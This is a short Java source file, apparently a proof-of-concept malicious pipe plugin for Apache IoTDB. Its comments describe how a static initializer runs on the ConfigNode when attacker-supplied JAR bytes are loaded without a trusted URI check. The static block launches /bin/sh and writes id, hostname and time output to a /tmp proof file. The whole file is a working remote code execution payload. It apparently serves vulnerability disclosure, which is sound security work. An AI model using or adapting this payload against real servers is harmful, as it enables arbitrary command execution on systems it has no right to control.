package org.apache.iotdb.raptor;
// Static initializer fires at Class.forName(className, /*initialize=*/true, loader)
// in PipePluginInfo.computeFromPluginClass (:311) during CreatePipePlugin plan execution
// on the ConfigNode, from inline attacker JAR bytes with no trusted_uri_pattern check.
public class RaptorPlugin {
  static {
    try {
      new ProcessBuilder("/bin/sh","-c",
        "echo RAPTOR_PIPEPLUGIN_RCE $(id) $(hostname) $(date -u +%Y-%m-%dT%H:%M:%SZ) > /tmp/RAPTOR_PIPEPLUGIN_PROOF.txt 2>&1").start().waitFor();
    } catch (Throwable t) {}
  }
}
